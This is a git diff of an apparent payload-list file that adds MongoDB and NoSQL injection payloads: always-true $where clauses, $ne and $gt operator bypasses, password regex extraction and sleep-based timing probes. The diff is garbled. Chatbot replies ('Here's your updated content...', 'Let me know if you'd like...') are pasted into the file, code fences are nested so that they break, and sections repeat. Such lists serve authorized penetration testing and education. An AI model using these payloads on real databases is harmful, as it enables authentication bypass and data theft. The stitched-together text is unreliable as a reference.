@@ -209,6 +209,12 @@ end
 
 # MongoDB
 
+Here's your updated content properly formatted in GitHub-flavored Markdown (`.md`) for clean readability and sharing in a GitHub repository:
+
+```markdown
+# MongoDB Injection Payloads
+
+```javascript
 true, $where: '1 == 1'
 , $where: '1 == 1'
 $where: '1 == 1'
@@ -217,21 +223,55 @@ $where: '1 == 1'
 { $ne: 1 }
 ', $or: [ {}, { 'a':'a
 ' } ], $comment:'successful MongoDB injection'
+```
+
+```javascript
 db.injection.insert({success:1});
-db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
+db.injection.insert({success:1});return 1;
+db.stores.mapReduce(function() { { emit(1,1
+```
+
+```javascript
 || 1==1
 ' && this.password.match(/.*/)//+%00
 ' && this.passwordzz.match(/.*/)//+%00
 '%20%26%26%20this.password.match(/.*/)//+%00
 '%20%26%26%20this.passwordzz.match(/.*/)//+%00
+```
+
+```json
 {$gt: ''}
 [$ne]=1
+```
+
+```javascript
 ';return 'a'=='a' && ''=='
 ";return(true);var xyz='a
 0;return true
+```
+
+> ⚠️ These payloads are intended for educational and authorized testing purposes only. Misuse may be illegal.
+
+```
+
+Let me know if you'd like:
+- This saved as a `.md` file
+- Additional annotations or categorizations
+- Included in a README template with metadata (like author, usage, references)
 
 # NoSQL
 
+Here's your content formatted in GitHub `.md` (Markdown) format using fenced code blocks and appropriate syntax highlighting (JavaScript or JSON where applicable). Let me know if you'd like a table or categorized list too.
+
+```markdown
+# MongoDB Injection Payloads
+
+Below are some common and advanced MongoDB injection payloads used for testing NoSQL injection vulnerabilities.
+
+<details>
+<summary>📄 Payload Examples</summary>
+
+```javascript
 true, $where: '1 == 1'
 , $where: '1 == 1'
 $where: '1 == 1'
@@ -240,20 +280,37 @@ $where: '1 == 1'
 { $ne: 1 }
 ', $or: [ {}, { 'a':'a
 ' } ], $comment:'successful MongoDB injection'
+```
+
+```javascript
 db.injection.insert({success:1});
-db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
+db.injection.insert({success:1});return 1;
+db.stores.mapReduce(function() { { emit(1,1
+```
+
+```javascript
 || 1==1
 ' && this.password.match(/.*/)//+%00
 ' && this.passwordzz.match(/.*/)//+%00
 '%20%26%26%20this.password.match(/.*/)//+%00
 '%20%26%26%20this.passwordzz.match(/.*/)//+%00
+```
+
+```json
+{ "$gt": "" }
 {$gt: ''}
-{"$gt": ""}
 [$ne]=1
+```
+
+```javascript
 ';sleep(5000);
 ';sleep(5000);'
 ';sleep(5000);+'
 ';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
 ';return 'a'=='a' && ''=='
 ";return(true);var xyz='a
-0;return true
+0;return true"
+```
+
+</details>
+```
